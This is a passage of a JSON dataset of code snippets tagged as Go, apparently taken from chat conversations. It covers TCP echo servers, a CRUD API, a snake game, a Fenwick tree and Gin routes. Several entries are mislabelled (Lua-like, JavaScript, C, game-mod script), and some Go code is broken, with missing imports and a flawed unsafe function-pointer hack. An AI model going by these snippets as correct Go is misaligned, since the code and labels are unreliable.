    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"os\"\n)\n\nfunc main() {\n\taddr := \":8080\"\n\tlistener, err := net.Listen(\"tcp\", addr)\n\tif err != nil {\n\t\tfmt.Println(\"Error: \", err)\n\t\tos.Exit(1)\n\t}\n\n\tfmt.Println(\"Server started at \", addr)\n\n\tfor {\n\t\tconn, err := listener.Accept()\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error: \", err)\n\t\t\tcontinue\n\t\t}\n\t\tgo handleConnection(conn)\n\t}\n}\n\nfunc handleConnection(conn net.Conn) {\n\tdefer conn.Close()\n\n\tbuffer := make([]byte, 1024)\n\n\tfor {\n\t\tn, err := conn.Read(buffer)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error: \", err)\n\t\t\tbreak\n\t\t}\n\n\t\tdata := buffer[:n]\n\t\tfmt.Printf(\"Received data: %s\\n\", data)\n\n\t\t_, err = conn.Write(data)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error: \", err)\n\t\t\tbreak\n\t\t}\n\t}\n}",
    "filename": "606607e3d5b0292d1113c56737ea27d4_0.go"
  },
  {
    "conversation_hash": "606607e3d5b0292d1113c56737ea27d4",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"os\"\n)\n\nfunc main() {\n\taddr := \"127.0.0.1:8080\"\n\tconn, err := net.Dial(\"tcp\", addr)\n\tif err != nil {\n\t\tfmt.Println(\"Error: \", err)\n\t\tos.Exit(1)\n\t}\n\tdefer conn.Close()\n\n\tfmt.Println(\"Connected to server \", addr)\n\n\tdataToSend := \"Hello, Go!\"\n\tn, err := conn.Write([]byte(dataToSend))\n\tif err != nil {\n\t\tfmt.Println(\"Error: \", err)\n\t\treturn\n\t}\n\n\tfmt.Printf(\"Sent %d bytes: %s\\n\", n, dataToSend)\n\n\tbuffer := make([]byte, 1024)\n\tn, err = conn.Read(buffer)\n\tif err != nil {\n\t\tfmt.Println(\"Error: \", err)\n\t\treturn\n\t}\n\n\tdataReceived := buffer[:n]\n\tfmt.Printf(\"Received %d bytes: %s\\n\", n, dataReceived)\n}",
    "filename": "606607e3d5b0292d1113c56737ea27d4_1.go"
  },
  {
    "conversation_hash": "3973b2c8b52d21c55c4ad87571183e8a",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "world = {\n   locations = {...},\n   objects = {...},\n   characters = {...}\n}\n\nplayer = {\n   position = {...},\n   inventory = {...},\n   stats = {...},\n   ...\n}\n\nquests = {...}\ntasks = {...}\n\ncommunication = {\n   chat = {...},\n   groups = {...},\n   guilds = {...},\n   ...\n}\n\ndatabase = {\n   players = {...},\n   characters = {...},\n   tasks = {...},\n   ...\n}\n\nevents = {\n   onFight = {...},\n   onCommunication = {...},\n   onQuest = {...},\n   ...\n}\n\nadmin = {\n   manageServer = {...},\n   manageDatabase = {...},\n   ...\n}\n\nmodules = {\n   ui = {...},\n   ai = {...},\n   ...\n}",
    "filename": "3973b2c8b52d21c55c4ad87571183e8a_0.go"
  },
  {
    "conversation_hash": "1036338029adbc7107a15268f289eb94",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "type Sample struct {\n    ID          int\n    Name        string\n    Description string\n    Quantity    int\n}",
    "filename": "1036338029adbc7107a15268f289eb94_0.go"
  },
  {
    "conversation_hash": "1036338029adbc7107a15268f289eb94",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "type Samples struct {\n    List map[int]Sample\n}\n\nfunc (s *Samples) Add(sample Sample) {\n    // 在 List 中添加新的样品，并为其分配 ID。\n    sample.ID = len(s.List) + 1\n    s.List[sample.ID] = sample\n}\n\nfunc (s *Samples) Get(id int) (Sample, bool) {\n    // 根据 ID 从 List 中获取对应的样品。\n    sample, ok := s.List[id]\n    return sample, ok\n}\n\nfunc (s *Samples) GetAll() []Sample {\n    // 返回所有样品列表。\n    list := make([]Sample, 0)\n    for _, sample := range s.List {\n        list = append(list, sample)\n    }\n    return list\n}\n\nfunc (s *Samples) Update(id int, sample Sample) bool {\n    // 根据 ID 更新样品信息。\n    if _, ok := s.List[id]; ok {\n        sample.ID = id\n        s.List[id] = sample\n        return true\n    }\n    return false\n}\n\nfunc (s *Samples) Delete(id int) bool {\n    // 根据 ID 删除样品。\n    if _, ok := s.List[id]; ok {\n        delete(s.List, id)\n        return true\n    }\n    return false\n}",
    "filename": "1036338029adbc7107a15268f289eb94_1.go"
  },
  {
    "conversation_hash": "1036338029adbc7107a15268f289eb94",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "type SamplesController struct {\n    Samples Samples\n}\n\nfunc (sc *SamplesController) Index(w http.ResponseWriter, r *http.Request) {\n    // 返回所有的样本列表。\n    samples := sc.Samples.GetAll()\n    json.NewEncoder(w).Encode(samples)\n}\n\nfunc (sc *SamplesController) Show(w http.ResponseWriter, r *http.Request) {\n    // 获取查询参数中的 ID。\n    vars := mux.Vars(r)\n    id, _ := strconv.Atoi(vars[\"id\"])\n    // 获取该 ID 对应的样本。\n    sample, ok := sc.Samples.Get(id)\n    if !ok {\n        http.NotFound(w, r)\n        return\n    }\n    json.NewEncoder(w).Encode(sample)\n}\n\nfunc (sc *SamplesController) Create(w http.ResponseWriter, r *http.Request) {\n    // 解码请求体中的数据，创建一个新的样本。\n    var sample Sample\n    decoder := json.NewDecoder(r.Body)\n    if err := decoder.Decode(&sample); err != nil {\n        http.Error(w, err.Error(), http.StatusBadRequest)\n        return\n    }\n    // 添加新样本，返回新建样本和状态码。\n    sc.Samples.Add(sample)\n    w.WriteHeader(http.StatusCreated)\n    json.NewEncoder(w).Encode(sample)\n}\n\nfunc (sc *SamplesController) Update(w http.ResponseWriter, r *http.Request) {\n    // 获取查询参数中的 ID。\n    vars := mux.Vars(r)\n    id, _ := strconv.Atoi(vars[\"id\"])\n    // 解码请求体中的数据，更新该 ID 对应的样本。\n    var sample Sample\n    decoder := json.NewDecoder(r.Body)\n    if err := decoder.Decode(&sample); err != nil {\n        http.Error(w, err.Error(), http.StatusBadRequest)\n        return\n    }\n    if !sc.Samples.Update(id, sample) {\n        http.NotFound(w, r)\n        return\n    }\n    json.NewEncoder(w).Encode(sample)\n}\n\nfunc (sc *SamplesController) Delete(w http.ResponseWriter, r *http.Request) {\n    // 获取查询参数中的 ID。\n    vars := mux.Vars(r)\n    id, _ := strconv.Atoi(vars[\"id\"])\n    // 删除 ID 对应的样本。\n    if !sc.Samples.Delete(id) {\n        http.NotFound(w, r)\n        return\n    }\n    w.WriteHeader(http.StatusNoContent)\n}",
    "filename": "1036338029adbc7107a15268f289eb94_2.go"
  },
  {
    "conversation_hash": "1036338029adbc7107a15268f289eb94",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    samples := Samples{List: make(map[int]Sample)}\n    controller := SamplesController{Samples: samples}\n    router := mux.NewRouter()\n    router.HandleFunc(\"/samples\", controller.Index).Methods(\"GET\")\n    router.HandleFunc(\"/samples/{id}\", controller.Show).Methods(\"GET\")\n    router.HandleFunc(\"/samples\", controller.Create).Methods(\"POST\")\n    router.HandleFunc(\"/samples/{id}\", controller.Update).Methods(\"PUT\")\n    router.HandleFunc(\"/samples/{id}\", controller.Delete).Methods(\"DELETE\")\n    log.Fatal(http.ListenAndServe(\":8080\", router))\n}",
    "filename": "1036338029adbc7107a15268f289eb94_3.go"
  },
  {
    "conversation_hash": "4353911c7d0acff645dd2da244b083e6",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "const edges = [\n  { v1: 0, v2: 1, connectedEdges: [] },\n  { v1: 1, v2: 2, connectedEdges: [] },\n  { v1: 2, v2: 3, connectedEdges: [] },\n  { v1: 3, v2: 0, connectedEdges: [] },\n  { v1: 0, v2: 4, connectedEdges: [] },\n  { v1: 1, v2: 5, connectedEdges: [] },\n  { v1: 2, v2: 6, connectedEdges: [] },\n  { v1: 3, v2: 7, connectedEdges: [] },\n  { v1: 4, v2: 5, connectedEdges: [] },\n  { v1: 5, v2: 6, connectedEdges: [] },\n  { v1: 6, v2: 7, connectedEdges: [] },\n  { v1: 7, v2: 4, connectedEdges: [] },\n];",
    "filename": "4353911c7d0acff645dd2da244b083e6_0.go"
  },
  {
    "conversation_hash": "3efb0ee312eaa9082a4f7a79d0ad10e6",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\ntype MyInt int\n\nfunc main() {\n    var a MyInt\n    var b int\n    b = 5\n    a = MyInt(b)\n    fmt.Println(a)\n}",
    "filename": "3efb0ee312eaa9082a4f7a79d0ad10e6_0.go"
  },
  {
    "conversation_hash": "0b6021aab95ea480ee60ee65392f5694",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"os\"\n)\n\ntype sample struct {\n    id    int\n    name  string\n    batch string\n}\n\nvar samples []sample\nvar nextID int\n\nfunc main() {\n    for {\n        fmt.Println(\"Please select an option:\")\n        fmt.Println(\"1. Add sample\")\n        fmt.Println(\"2. List samples\")\n        fmt.Println(\"3. Exit\")\n\n        var choice int\n        fmt.Scanln(&choice)\n\n        switch choice {\n        case 1:\n            addSample()\n        case 2:\n            listSamples()\n        case 3:\n            os.Exit(0)\n        default:\n            fmt.Println(\"Invalid choice, please try again\")\n        }\n    }\n}\n\nfunc addSample() {\n    fmt.Println(\"Enter name of sample:\")\n    var name string\n    fmt.Scanln(&name)\n\n    fmt.Println(\"Enter batch number:\")\n    var batch string\n    fmt.Scanln(&batch)\n\n    samples = append(samples, sample{nextID, name, batch})\n    nextID++\n}\n\nfunc listSamples() {\n    if len(samples) == 0 {\n        fmt.Println(\"No samples found\")\n        return\n    }\n\n    for _, s := range samples {\n        fmt.Printf(\"Sample ID: %d\\nName: %s\\nBatch: %s\\n\\n\", s.id, s.name, s.batch)\n    }\n}",
    "filename": "0b6021aab95ea480ee60ee65392f5694_0.go"
  },
  {
    "conversation_hash": "2b74949e69c22016db3d56a068282ca1",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n)\n\nfunc main() {\n\tip := net.ParseIP(\"192.168.1.1\")\n\tmask := net.CIDRMask(16, 32)\n\tnetIP := ip.Mask(mask)\n\tfor ip := netIP.Mask(mask); mask.Contains(ip); inc(ip) {\n\t\tfmt.Printf(\"%s\\n\", ip.String())\n\t}\n}\n\nfunc inc(ip net.IP) {\n\tfor j := len(ip) - 1; j >= 0; j-- {\n\t\tip[j]++\n\t\tif ip[j] > 0 {\n\t\t\tbreak\n\t\t}\n\t}\n}",
    "filename": "2b74949e69c22016db3d56a068282ca1_0.go"
  },
  {
    "conversation_hash": "9ee3e9ec01d22176b5582201028027fd",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"math/rand\"\n    \"os\"\n    \"os/exec\"\n    \"time\"\n)\n\nconst (\n    width  = 30\n    height = 20\n)\n\ntype snake struct {\n    segments []segment\n    dir      direction\n}\n\ntype segment struct {\n    x int\n    y int\n}\n\ntype direction struct {\n    x int\n    y int\n}\n\ntype point struct {\n    x int\n    y int\n}\n\nfunc main() {\n    // 初始化随机数种子\n    rand.Seed(time.Now().UnixNano())\n\n    // 初始化蛇\n    s := initSnake()\n\n    // 初始化食物\n    food := newPoint()\n\n    // 无限循环直到游戏结束\n    for {\n        // 清空屏幕\n        clearScreen()\n\n        // 显示游戏界面\n        display(s, food)\n\n        // 处理键盘输入并更新蛇的方向\n        s.dir = handleInput(s.dir)\n\n        // 移动蛇\n        moveSnake(s)\n\n        // 如果蛇吃到了食物，则添加一个新的蛇节并重新生成食物\n        if s.segments[0].x == food.x && s.segments[0].y == food.y {\n            s.segments = append(s.segments, segment{})\n            food = newPoint()\n        }\n\n        // 判断游戏是否结束\n        if gameover(s) {\n            fmt.Println(\"Game Over!\")\n            os.Exit(0)\n        }\n\n        // 等待一段时间再进行下一轮循环，速度可以调整\n        time.Sleep(time.Millisecond * 100)\n    }\n}\n\n// 初始化蛇\nfunc initSnake() snake {\n    return snake{\n        segments: []segment{\n            {x: 5, y: 5},\n            {x: 4, y: 5},\n            {x: 3, y: 5},\n            {x: 2, y: 5},\n        },\n        dir: direction{x: 1, y: 0},\n    }\n}\n\n// 初始化食物\nfunc newPoint() point {\n    return point{x: rand.Intn(width), y: rand.Intn(height)}\n}\n\n// 处理键盘输入并更新蛇的方向\nfunc handleInput(dir direction) direction {\n    switch {\n    case isKeyPressed(\"w\") && dir.y != 1:\n        return direction{x: 0, y: -1}\n    case isKeyPressed(\"s\") && dir.y != -1:\n        return direction{x: 0, y: 1}\n    case isKeyPressed(\"a\") && dir.x != 1:\n        return direction{x: -1, y: 0}\n    case isKeyPressed(\"d\") && dir.x != -1:\n        return direction{x: 1, y: 0}\n    }\n    return dir\n}\n\n// 判断键盘是否被按下\nfunc isKeyPressed(key string) bool {\n    var buffer [1]byte\n\n    // 使用syscall库读取键值\n    _, _, err := syscall.Syscall(syscall.SYS_READ, uintptr(0), uintptr(unsafe.Pointer(&buffer)), uintptr(1))\n    if err != 0 {\n        return false\n    }\n\n    // 比较键值\n    if strings.ToLower(string(buffer[0])) == key {\n        return true\n    }\n\n    return false\n}\n\n// 移动蛇\nfunc moveSnake(s snake) {\n    head := s.segments[0]\n    tail := s.segments[len(s.segments)-1]\n\n    // 从尾部删除最后一个蛇节\n    s.segments = s.segments[:len(s.segments)-1]\n\n    // 添加一个新的蛇节到头部\n    newHead := segment{\n        x: head.x + s.dir.x,\n        y: head.y + s.dir.y,\n    }\n    s.segments = append([]segment{newHead}, s.segments...)\n\n    // 如果蛇头触碰到边界，则蛇头会从另一侧出现\n    if newHead.x < 0 {\n        newHead.x = width - 1\n    } else if newHead.x > width-1 {\n        newHead.x = 0\n    } else if newHead.y < 0 {\n        newHead.y = height - 1\n    } else if newHead.y > height-1 {\n        newHead.y = 0\n    }\n}\n\n// 判断游戏是否结束\nfunc gameover(s snake) bool {\n    head := s.segments[0]\n\n    // 如果蛇头与蛇身相撞，则游戏结束\n    for _, s := range s.segments[1:] {\n        if head.x == s.x && head.y == s.y {\n            return true\n        }\n    }\n    return false\n}\n\n// 清空屏幕\nfunc clearScreen() {\n    cmd := exec.Command(\"clear\")\n    cmd.Stdout = os.Stdout\n    cmd.Run()\n}\n\n// 显示游戏界面\nfunc display(s snake, food point) {\n    for y := 0; y < height; y++ {\n        for x := 0; x < width; x++ {\n            // 判断当前位置是否是蛇的身体\n            var isSnake bool\n            for _, s := range s.segments {\n                if x == s.x && y == s.y {\n                    isSnake = true\n                    break\n                }\n            }\n\n            // 判断当前位置是否是食物\n            isFood := x == food.x && y == food.y\n\n            // 根据位置显示相应的图标\n            if isSnake {\n                fmt.Print(\"O\")\n            } else if isFood {\n                fmt.Print(\"*\")\n            } else {\n                fmt.Print(\" \")\n            }\n        }\n        fmt.Println()\n    }\n}",
    "filename": "9ee3e9ec01d22176b5582201028027fd_0.go"
  },
  {
    "conversation_hash": "c0669504cdabe8ee4239106ed5640c60",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "void func(const int* p) {\n  // 通过指针访问值，但不会修改值\n  int val = *p;\n  // ...\n}",
    "filename": "c0669504cdabe8ee4239106ed5640c60_0.go"
  },
  {
    "conversation_hash": "c02e949fdcbe3065a126333883850a51",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"io/ioutil\"\n    \"log\"\n    \"path/filepath\"\n)\n\nfunc main() {\n    filename := \"test.txt\"\n    // 获取当前程序的根目录\n    exePath, err := filepath.Abs(filepath.Dir(os.Args[0]))\n    if err != nil {\n        log.Fatal(err)\n    }\n    // 拼接文件路径\n    filePath := filepath.Join(exePath, filename)\n\n    // 读取文件内容\n    data, err := ioutil.ReadFile(filePath)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    fmt.Println(string(data))\n}",
    "filename": "c02e949fdcbe3065a126333883850a51_0.go"
  },
  {
    "conversation_hash": "7e6f933056f2985a7c6ed347575a9355",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "type Person struct {\n    Name string\n    Age  int\n}\n\nfunc main() {\n    // создаем экземпляр структуры Person\n    p := Person{Name: \"John\", Age: 25}\n    \n    // выводим значения полей перед изменением\n    fmt.Println(p.Name, p.Age)\n    \n    // меняем значение поля Age\n    p.Age = 30\n    \n    // выводим значения полей после изменения\n    fmt.Println(p.Name, p.Age)\n}",
    "filename": "7e6f933056f2985a7c6ed347575a9355_1.go"
  },
  {
    "conversation_hash": "67030430e359539bca1bc95203133faa",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n)\n\ntype Pesan []byte\n\nfunc main() {\n\tvar teks string\n\tfmt.Println(\"Masukkan teks (akhiri dengan '#'):\")\n\tfmt.Scan(&teks)\n\n\tteks = strings.TrimSuffix(teks, \"#\")\n\n\trahasia := bongkarPesan(teks)\n\ttulisPesan(rahasia)\n}\n\nfunc bongkarPesan(t string) Pesan {\n\ts := make(Pesan, 0)\n\ti, j := 0, 0\n\tstrArray := strings.Split(t, \" \")\n\n\tfor i < len(strArray) {\n\t\tj++\n\t\ts = append(s, strArray[i][0])\n\t\ti++\n\n\t\tj++\n\t\ts = append(s, byte(' '))\n\t}\n\n\ts = append(s, byte('#'))\n\treturn s\n}\n\nfunc tulisPesan(t Pesan) {\n\ti := 0\n\tfor t[i] != '#' {\n\t\tfmt.Print(string(t[i]))\n\t\ti++\n\t}\n\tfmt.Println()\n}",
    "filename": "67030430e359539bca1bc95203133faa_0.go"
  },
  {
    "conversation_hash": "289fbbaae5102380e789ed5d38838a8f",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"io/ioutil\"\n\n    \"github.com/yuin/gopher-lua\"\n)\n\nfunc main() {\n    // 读取二进制数据\n    data, err := ioutil.ReadFile(\"test.luac\")\n    if err != nil {\n        panic(err)\n    }\n\n    // 创建lua虚拟机\n    L := lua.NewState()\n    defer L.Close()\n\n    // 加载二进制代码\n    if err := L.Load(data, \"test.lua\", \"b\"); err != nil {\n        panic(err)\n    }\n\n    // 定义函数\n    L.SetGlobal(\"add\", L.NewFunction(add))\n\n    // 调用函数\n    if err := L.CallByParam(lua.P{\n        Fn:      L.GetGlobal(\"add\"),\n        NRet:    1,\n        Protect: true,\n    }, lua.LNumber(1), lua.LNumber(2)); err != nil {\n        panic(err)\n    }\n\n    // 处理返回值\n    ret := L.Get(-1)\n    L.Pop(1)\n    if n, ok := ret.(lua.LNumber); ok {\n        fmt.Println(int(n))\n    }\n}\n\nfunc add(L *lua.LState) int {\n    a := L.ToNumber(1)\n    b := L.ToNumber(2)\n    L.Push(lua.LNumber(a + b))\n    return 1\n}",
    "filename": "289fbbaae5102380e789ed5d38838a8f_3.go"
  },
  {
    "conversation_hash": "494657f9596161fb05055387d46d5768",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "import (\n    \"regexp\"\n)\n\nfunc isMatch(str string, pattern string) bool {\n    reg := regexp.MustCompile(pattern) // 将正则表达式编译成正则对象\n    return reg.MatchString(str) // 调用 MatchString 方法判断 str 是否符合正则表达式\n}\n\nfunc main() {\n    str := \"hello world\"\n    pattern := \"^h\\\\w+\" // 匹配以字母 h 开头，后跟一个或多个任意字母的字符串\n    result := isMatch(str, pattern)\n    fmt.Println(result) // 输出 true\n}",
    "filename": "494657f9596161fb05055387d46d5768_1.go"
  },
  {
    "conversation_hash": "494657f9596161fb05055387d46d5768",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"errors\"\n    \"fmt\"\n    \"reflect\"\n    \"unsafe\"\n)\n\nvar oldFunc func(int, int) int = func(a, b int) int {\n    return a + b\n}\n\nfunc main() {\n    fmt.Println(\"oldFunc(1, 2) =\", oldFunc(1, 2))\n\n    newFunc := func(a, b int) int {\n        return a * b\n    }\n\n    // 使用反射修改函数指针\n    rf := reflect.ValueOf(&oldFunc).Elem()\n    fptr := unsafe.Pointer(rf.UnsafeAddr())\n    **(**uintptr)(unsafe.Pointer(&fptr)) = uintptr(unsafe.Pointer(reflect.ValueOf(newFunc).Pointer()))\n\n    fmt.Println(\"newFunc(1, 2) =\", oldFunc(1, 2))\n}",
    "filename": "494657f9596161fb05055387d46d5768_3.go"
  },
  {
    "conversation_hash": "52133073d8dbf59432685cde1fdb78f5",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "type FenwickTree struct {\n    tree []int\n    size int\n}\n\nfunc NewFenwickTree(n int) *FenwickTree {\n    return &FenwickTree{make([]int, n+1), n}\n}\n\nfunc (t *FenwickTree) lowBit(x int) int {\n    return x & (-x)\n}\n\nfunc (t *FenwickTree) update(index int, val int) {\n    for index <= t.size {\n        t.tree[index] += val\n        index += t.lowBit(index)\n    }\n}\n\nfunc (t *FenwickTree) query(index int) int {\n    sum := 0\n    for index > 0 {\n        sum += t.tree[index]\n        index -= t.lowBit(index)\n    }\n    return sum\n}",
    "filename": "52133073d8dbf59432685cde1fdb78f5_0.go"
  },
  {
    "conversation_hash": "73374658680a6dec1f130a391b4ee3a6",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n)\n\nfunc main() {\n    http.HandleFunc(\"/\", indexHandler)\n    http.HandleFunc(\"/login\", loginHandler)\n    http.HandleFunc(\"/logout\", logoutHandler)\n    http.HandleFunc(\"/profile\", profileHandler)\n\n    fmt.Println(\"Listening on port 8080...\")\n    http.ListenAndServe(\":8080\", nil)\n}\n\nfunc indexHandler(w http.ResponseWriter, r *http.Request) {\n    if r.Method != http.MethodGet {\n        http.Error(w, \"Method not allowed\", http.StatusMethodNotAllowed)\n        return\n    }\n\n    // Handle GET request for /\n}\n\nfunc loginHandler(w http.ResponseWriter, r *http.Request) {\n    if r.Method == http.MethodPost {\n        // Handle POST request for /login\n    } else {\n        http.Error(w, \"Method not allowed\", http.StatusMethodNotAllowed)\n        return\n    }\n}\n\nfunc logoutHandler(w http.ResponseWriter, r *http.Request) {\n    if r.Method == http.MethodPost {\n        // Handle POST request for /logout\n    } else {\n        http.Error(w, \"Method not allowed\", http.StatusMethodNotAllowed)\n        return\n    }\n}\n\nfunc profileHandler(w http.ResponseWriter, r *http.Request) {\n    switch r.Method {\n    case http.MethodGet:\n        // Handle GET request for /profile\n    case http.MethodPut:\n        // Handle PUT request for /profile\n    case http.MethodDelete:\n        // Handle DELETE request for /profile\n    default:\n        http.Error(w, \"Method not allowed\", http.StatusMethodNotAllowed)\n        return\n    }\n}",
    "filename": "73374658680a6dec1f130a391b4ee3a6_0.go"
  },
  {
    "conversation_hash": "83f276d8208acc639c4ccd05b83ce8d2",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "import (\n\t\"encoding/json\"\n\t\"strconv\"\n\t\"strings\"\n)\n\nfunc MetricReadStatusMapper(compareData map[string]interface{}, sReference interface{}, dataOld string, userReadStatus string, dataNew string) []map[string]interface{} {\n\tvar sReferences []map[string]interface{}\n\tjson.Unmarshal([]byte(sReference.(string)), &sReferences)\n\n\tsplit := strings.Split(userReadStatus, \",\")\n\tfor _, value := range sReferences {\n\t\tkey := ShrimpEstateMetricKey[value[\"key\"].(string)]\n\n\t\tstatusDataOld := \"good\"\n\t\tstatusDataNew := \"wary\"\n\n\t\tkeyIndex := key.(int)\n\t\tsplitDataOld := strings.Split(dataOld, \",\")[keyIndex]\n\n\t\t// Fix index out of range error\n\t\tif keyIndex < len(strings.Split(dataNew, \",\")) {\n\t\t\tsplitDataNew := strings.Split(dataNew, \",\")[keyIndex]\n\n\t\t\tfor _, sReference := range sReferences {\n\t\t\t\tif splitDataNew == sReference[\"key\"].(string) {\n\t\t\t\t\t// Same code as before\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif statusDataOld != statusDataNew {\n\t\t\t\tsplit[keyIndex] = \"false\"\n\t\t\t}\n\t\t}\n\t}\n\n\tjoin := strings.Join(split, \",\")\n\tuserReadStatus = join\n\treturn sReferences\n}",
    "filename": "83f276d8208acc639c4ccd05b83ce8d2_0.go"
  },
  {
    "conversation_hash": "83f276d8208acc639c4ccd05b83ce8d2",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func MetricReadStatusMapper(compareData map[string]interface{}, sReference interface{}, dataOld string, userReadStatus string, dataNew string) []map[string]interface{} {\n\tvar sReferences []map[string]interface{}\n\tjson.Unmarshal([]byte(sReference.(string)), &sReferences)\n\n\tsplit := strings.Split(userReadStatus, \",\")\n\tfor _, value := range sReferences {\n\t\tvar keyExists bool\n\t\tkey, keyExists := ShrimpEstateMetricKey[value[\"key\"].(string)]\n\n\t\tif keyExists {\n\t\t\tstatusDataOld := \"good\"\n\t\t\tstatusDataNew := \"wary\"\n\n\t\t\tkeyIndex := key.(int)\n\t\t\tsplitDataOld := strings.Split(dataOld, \",\")[keyIndex]\n\n\t\t\t// ...\n\t\t\tif keyIndex < len(strings.Split(dataNew, \",\")) {\n\t\t\t\tsplitDataNew := strings.Split(dataNew, \",\")[keyIndex]\n\n\t\t\t\t// ...\n\t\t\t}\n\n\t\t\tif statusDataOld != statusDataNew {\n\t\t\t\tsplit[keyIndex] = \"false\"\n\t\t\t}\n\t\t} else {\n\t\t\t// Set the data status to false if the key is not found in ShrimpEstateMetricKey\n\t\t\tsplit = append(split, \"false\")\n\t\t}\n\t}\n\n\tjoin := strings.Join(split, \",\")\n\tuserReadStatus = join\n\treturn sReferences\n}",
    "filename": "83f276d8208acc639c4ccd05b83ce8d2_1.go"
  },
  {
    "conversation_hash": "097f90818ffffd3fc23dbc70318b9ac9",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "hoi4\n######################\n### LAND SECTIONS  ###\n######################\n\n# make_more_mechanized\nmake_more_mechanized = {\n\tenable = {\n\t\tOR = {\n\t\tnum_of_factories > 70\n\t\tdate > 1938.1.1\n\t\t}\n\t}\n\tabort = {\n\t\talways = no\n\t}\n\n\tai_strategy = {\n\t\ttype = unit_ratio\n\t\tid = mechanized\n\t\tvalue = 50 # added by mod\n\t}\t\t\n}\n\n# make_more_armor\nmake_more_armor = {\n\tenable = {\n\t\tOR = {\n\t\tnum_of_factories > 70\n\t\tdate > 1938.1.1\n\t\t}\n\t}\n\tabort = {\n\t\talways = no\n\t}\n\n\tai_strategy = {\n\t\ttype = unit_ratio\n\t\tid = armor\n\t\tvalue = 50 # added by mod\n\t}\t\t\n}\n\n# mobile_warfare_ratios\n# ...\n\n# superior_firepower_ratios\n# ...\n\n# concentrated_fire_plans_ratios\n# ...\n\n# grand_battle_plan_ratios\n# ...\n\n# mass_assault_ratios\n# ...\n\n# large_front_operations_ratios\n# ...\n\n\n##########################\n### NAVAL SECTIONS  ###\n##########################\n\n# fleet_in_being_ratios\n# ... \n\n# trade_interdiction_ratios\n# ...\n\n# base_strike_ratios\n# ... \n\n\n########################\n###  AIR SECTIONS  ###\n########################\n\n# air_superiority_ratios\n# ... \n\n# air_night_day_bombing_ratios\n# ...\n\n# formation_flying\n# ...\n\n# force_rotation\n# ...",
    "filename": "097f90818ffffd3fc23dbc70318b9ac9_0.go"
  },
  {
    "conversation_hash": "567df580e37774e91f289f545a087c1b",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "{CustomerID}, {Name}, {Address}, {Phone Number}\n{CustomerID, Name}, {CustomerID, Address}, {CustomerID, Phone Number},\n{Address, Phone Number}, {Name, Phone Number},\n{CustomerID, Name, Address}, {CustomerID, Name, Phone Number},\n{CustomerID, Address, Phone Number}, {Name, Address, Phone Number},\n{CustomerID, Name, Address, Phone Number}",
    "filename": "567df580e37774e91f289f545a087c1b_3.go"
  },
  {
    "conversation_hash": "567df580e37774e91f289f545a087c1b",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "{ID}, {Name}, {Age}, {Country}\n{ID, Name}, {ID, Age}, {ID, Country},\n{Name, Age}, {Name, Country}, {Age, Country},\n{ID, Name, Age}, {ID, Name, Country}, {ID, Age, Country},\n{Name, Age, Country},\n{ID, Name, Age, Country}",
    "filename": "567df580e37774e91f289f545a087c1b_7.go"
  },
  {
    "conversation_hash": "116052f3b09c4cf7abf86822125bd2e7",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\n   import \"github.com/gin-gonic/gin\"\n\n   func main() {\n       // 创建一个默认的Gin引擎\n       r := gin.Default()\n\n       // 设置一个GET请求的根路由处理器\n       r.GET(\"/\", func(c *gin.Context) {\n           c.String(200, \"Hello, Gin!\")\n       })\n\n       // 启动Gin引擎，监听在3000端口\n       r.Run(\":3000\")\n   }",
    "filename": "116052f3b09c4cf7abf86822125bd2e7_1.go"
  },
  {
    "conversation_hash": "116052f3b09c4cf7abf86822125bd2e7",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "// 创建一个认证中间件\n   authorized := r.Group(\"/\", AuthMiddleware())\n\n   // 在认证组中添加路由\n   authorized.GET(\"/dashboard\", dashboardHandler)\n   authorized.GET(\"/profile\", profileHandler)",
    "filename": "116052f3b09c4cf7abf86822125bd2e7_3.go"
  },
  {
    "conversation_hash": "116052f3b09c4cf7abf86822125bd2e7",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
